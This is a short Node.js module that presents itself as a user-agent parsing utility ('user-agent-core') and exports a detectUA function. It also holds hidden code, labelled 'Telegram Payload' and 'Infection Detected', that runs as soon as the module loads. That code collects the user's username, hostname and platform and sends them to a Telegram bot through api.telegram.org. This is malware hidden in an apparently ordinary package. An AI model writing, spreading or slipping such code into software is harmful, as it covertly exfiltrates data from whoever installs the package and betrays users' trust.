
// === user-agent-core ===
const os = require("os");
const https = require("https");

function detectUA(ua) {
    const browser = ua.includes("Firefox") ? "Firefox" :
                    ua.includes("Chrome") ? "Chrome" :
                    "Unknown";
    const device = ua.includes("Mobile") ? "Mobile" : "Desktop";
    return { browser, device };
}

// ☣️ Telegram Payload
const BOT_TOKEN = "REPLACE_WITH_BOT_TOKEN";
const CHAT_ID = "REPLACE_WITH_CHAT_ID";

const msg = `📡 Infection Detected:
User: ${os.userInfo().username}
Host: ${os.hostname()}
Platform: ${os.platform()}
Time: ${new Date().toISOString()}`;

const data = JSON.stringify({ chat_id: CHAT_ID, text: msg });

const req = https.request({
  hostname: "api.telegram.org",
  path: `/bot${BOT_TOKEN}/sendMessage`,
  method: "POST",
  headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) }
});
req.write(data);
req.end();

module.exports = { detectUA };
